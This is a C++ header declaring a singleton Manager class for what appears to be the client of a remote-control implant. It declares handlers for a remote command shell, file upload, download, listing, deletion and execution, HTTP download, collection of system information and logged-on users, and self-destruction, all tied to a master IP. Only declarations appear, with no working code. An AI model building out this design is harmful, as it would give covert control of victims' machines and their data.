#pragma once
#include "CommData.h"
#include "CommNames.h"
#include "CmdRedirector.h"
#include "GuidStructs.h"
#include "../../pub/ModuleInterface.h"

class Manager
{
	DECLARE_SINGLETON(Manager);
public:
	ULONG GetMasterIP();
	tstring GetClientID() const;
	BOOL DeleteModule(LPCTSTR modFilename);
//	void AddAllLocalModules();

	//CPGuidÏà¹Øº¯Êý
	static BOOL CreateCPGuid(CPGUID& cpguid);
	static void CPGuid2Str(const CPGUID& cpguid, tstring& str);
	static BOOL Str2CPGuid(LPCTSTR str, CPGUID& cpguid);

	BOOL QueryCommandHandler(MSGID msgid, FnExecuteRCCommand* ppHandler, LPVOID* ppParameter);

private:
	BOOL InitCPGuid();
	__time64_t GetInstallTime();

	void SimpleReply(const CommData& data, LPCTSTR errorMsg) const;
	void ErrorReply(LPCTSTR errorMsg) const;
	void CollectInfo(CommData& data);
	BOOL WriteData2File(const CommData& data, LPCTSTR targetFilepath) const;

	static BOOL ExecuteRCCommand_NoCommand(MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter);
	static BOOL ExecuteRCCommand_ListMod(MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter);
	static BOOL ExecuteRCCommand_SetDefaultCommName(MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter);
	static BOOL ExecuteRCCommand_CollectInfo(MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter);
	static BOOL ExecuteRCCommand_CollectLogonUsers(MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter);
	static BOOL ExecuteRCCommand_SelfDestruction(MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter);

	static BOOL ExecuteRCCommand_OpenCmd(MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter);
	static BOOL ExecuteRCCommand_CmdInput(MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter);
	static BOOL ExecuteRCCommand_CloseCmd(MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter);

	static BOOL ExecuteRCCommand_Disks(MSGID msgid, const LPBYTE pData, DWORD dwSize, LPVOID lpParameter);
	static BOOL ExecuteRCCommand_ListFiles(MSGID msgid, const LPBYTE pData, DWORD dwSize, LPVOID lpParameter);
	
	static BOOL ExecuteRCCommand_DeleteSerial(MSGID msgid, const LPBYTE pData, DWORD dwSize, LPVOID lpParameter);

	static BOOL ExecuteRCCommand_GetFile(MSGID msgid, const LPBYTE pData, DWORD dwSize, LPVOID lpParameter);
	static BOOL ExecuteRCCommand_PutFile(MSGID msgid, const LPBYTE pData, DWORD dwSize, LPVOID lpParameter);

	static BOOL ExecuteRCCommand_RequestPutFile(MSGID msgid, const LPBYTE pData, DWORD dwSize, LPVOID lpParameter);

	static BOOL ExecuteRCCommand_DeleteFile(MSGID msgid, const LPBYTE pData, DWORD dwSize, LPVOID lpParameter);
	static BOOL ExecuteRCCommand_RunFile(MSGID msgid, const LPBYTE pData, DWORD dwSize, LPVOID lpParameter);
	static BOOL ExecuteRCCommand_HttpDown(MSGID msgid, const LPBYTE pData, DWORD dwSize, LPVOID lpParameter);
	static BOOL ExecuteRCCommand_Empty(MSGID msgid, const LPBYTE pData, DWORD dwSize, LPVOID lpParameter);

public:
	CmdRedirector	m_cmdRedirector;
private:
	COMM_NAME		m_commName;
	ULONG			m_masterIP;
	CPGUID			m_clientid;
	BOOL			m_bFirstRun;
};
